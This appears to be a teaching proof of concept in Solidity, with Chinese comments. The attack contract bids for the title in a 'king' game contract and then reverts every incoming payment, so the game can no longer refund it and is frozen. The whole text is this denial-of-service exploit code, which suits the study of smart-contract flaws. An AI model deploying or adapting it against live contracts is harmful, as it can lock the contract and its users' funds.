pragma solidity ^0.4.10;
contract Attack {
    function () { revert(); } // 故意revert造成调用失败

    function attack(address _target) public payable {
        _target.call.value(msg.value)(bytes4(keccak256("becomePresident()"))); // 调用国王合约中的竞选国王函数
    }
}